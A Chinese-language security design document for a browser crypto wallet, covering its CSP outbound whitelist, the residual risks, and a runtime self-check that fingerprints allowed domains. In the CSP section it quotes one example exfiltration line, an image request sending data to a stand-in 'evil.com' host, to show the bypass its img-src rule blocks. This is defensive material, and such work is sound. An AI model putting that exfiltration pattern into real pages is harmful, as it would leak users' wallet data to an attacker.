# 安全设计

本文说明 BitSPV 的安全分层，以及内置的**运行时安全自检**工具。

---

## 安全分层总览

| 层 | 作用 | 详见 |
|---|---|---|
| 私钥本地化 + PIN 加密 | 私钥只在浏览器解密、本地签名；泄露的加密数据也难以破解 | [pin-security.md](./pin-security.md) |
| CSP 网络隔离 | 即使页面被注入脚本，也**无法把数据发到白名单之外的域名** | 本文件 §CSP 网络隔离 |
| 运行时安全自检 | 把「当前页面到底允许访问哪些域名」显式呈现出来，并可检测变化 | 本文件 §运行时安全自检 |
| 空隔签名 / 离线版 | 冷端保管私钥，热端只做观察，扫码签名 | [air-gap-signing.md](./air-gap-signing.md) |

---

## CSP 网络隔离

项目在 `index.html` 通过 `<meta http-equiv="Content-Security-Policy">` 配置 CSP，对网络侧攻击形成独立防护层。

**核心思路**：钱包最怕的是「数据外传」。`connect-src` 是这条防线的主开关——`fetch` / `XMLHttpRequest` 只能访问白名单内的域名，其余一律被浏览器拦截；`img-src` 同样受限，堵死 `new Image().src = 'https://evil.com/?d=...'` 这类旁路。

**关键指令**

```
default-src 'self'
script-src  'self' https://www.google-analytics.com https://www.googletagmanager.com 'sha256-...'
connect-src 'self' https://223.5.5.5 https://dns.google ... （出站白名单）
img-src     'self' data: https://api.qrserver.com
require-trusted-types-for 'script'
```

**剩余风险**（已知、未消除）：

- CSP 用 `<meta>` 而非 HTTP 响应头，无法设置 `frame-ancestors`（点击劫持需服务器补充响应头；应用侧用运行时自检做提示）。
- `script-src` 信任了 `googletagmanager.com`，GTM 可动态加载任意脚本，是潜在供应链入口。
- CSP 挡不住物理接触设备后直接读 `localStorage`。

---

## 运行时安全自检

右下角日志台（Console）内置的诊断工具。它把「安全设施的当前实际状态」翻译成人能看懂的结论。

### 面向谁

- **普通用户**：一个**便利化的工具**。打开 Console 点一下，看到「无风险项 / x 项需关注」即可判断当前环境是否正常，不需要懂 CSP。
- **专业用户**：一个**可自行核对的清单**。出站域名、脚本域名、白名单指纹都摆在明面上，可以拿去和开源仓库、历史版本逐条比对。

### 入口

- **页面加载时自动跑一次**（摘要进日志台，日志台默认收起，不会打扰）。
- 右下角 **Console → 🛡 盾牌按钮**：手动重跑。
- **📋 复制按钮**：把完整诊断报告写入剪贴板，便于反馈问题。

### 检查项

| 检查 | 说明 |
|---|---|
| 安全上下文 | 是否 HTTPS / localhost（钱包的 WebCrypto 依赖它） |
| WebCrypto 可用 | `crypto.subtle` 是否存在（签名/加密的底座） |
| 未被 iframe 嵌套 | 防点击劫持 |
| CSP 策略存在 | 能否读到 CSP meta |
| `default-src 'self'` | 默认收紧 |
| **CSP 出站白名单 (connect-src)** | 逐个列出允许外联的域名 + 指纹 + 与预期比对 |
| **CSP 脚本白名单 (script-src)** | 允许执行的脚本来源 |
| CSP 来源异常 | punycode(`xn--`) / 裸 IP / 非 https / 全通配 |
| `unsafe-inline` / `unsafe-eval` | script-src 是否被放宽 |
| Trusted Types | 是否强制 `require-trusted-types-for 'script'` |
| 外部脚本 SRI | 外部 `<script>` 是否带 Subresource Integrity（已被 CSP 信任的算通过） |
| 内联脚本哈希 | 页面内联脚本是否与 CSP 里的 `sha256-…` 一致（**仅生产构建**） |

**输出默认很安静**：通过项折叠成 `x/y 通过`，只有问题项单独列出。

### CSP 出站白名单与指纹（核心）

这是整个工具的重点：**当前页面到底允许把数据发到哪些域名。**

- **实时解析**：直接读页面真实的 CSP meta，解析、归一化后得到出站域名清单——不是写死的。
- **指纹**：把出站域名排序后做 SHA-256，取前 24 位十六进制，例如
  `sha256:396268627e1501a19d0bd4d9`。**任何域名增删都会让指纹改变。**
- **与预期比对**：和构建时内嵌的基准（`src/security/expectedCsp.js`）比对，报出「新增未预期来源」和「较预期减少」。

### 信任模型与边界（重要）

- 页面能读到的，只是**「本站自己声明的 CSP」**。恶意作者可以自述一套宽松策略。
- 所以自检的价值是**透明化 + 变化可检测**，**不是绝对保证**。
- 真正的信任锚是：**开源仓库 + 你把指纹 pin 住**。
- 它是「检查那一刻的快照」，不是持续监控；发新版本后需刷新页面才会体现新清单。

### 如何解读

- `✅ 无风险项`：当前页面声明与实际环境均正常。
- `⚠️ x 项需关注`：下方逐条给出。常见可行动项只有两类——
  - **新增未预期来源**：出站白名单多了你没见过的域名 → 重点看，值得核对。
  - **CSP 被放宽 / 缺少关键指令**：防护强度下降。
- `ℹ️ CSP 备注`：punycode、裸 IP 这类「已知但值得留意」的来源，本身就写在预期白名单里，只是提示你它们存在。

### 给专业用户：如何 pin 指纹

1. 打开 Console → 复制诊断报告，拿到 `出站白名单指纹 sha256:…`。
2. 把它记进 changelog / issue / 自己的笔记。
3. 下次部署或换版本时再取一次，**指纹不一致 = 出站范围变了**，再对照仓库 diff 确认改了什么。

---

## 代码位置

| 文件 | 职责 |
|---|---|
| `index.html` | CSP 策略本体 |
| `src/utils/runtimeDiagnostics.js` | 自检逻辑：解析 CSP、归一化、指纹、异常、SRI、内联哈希、报告 |
| `src/security/expectedCsp.js` | 预期白名单基准（构建时内嵌） |
| `src/contexts/LogContext.jsx` | 页面加载时自动触发一次自检 |
| `src/components/DebugConsole.jsx` | 日志台 UI、手动自检与复制报告按钮 |

> 说明：`expectedCsp.js` 随应用一起打包，因此它只能检测「相对已知良好版本的漂移」，防不了「作者同时改页面和基准」的纯恶意场景。这也是为什么指纹 + 开源仓库比对仍然必要。
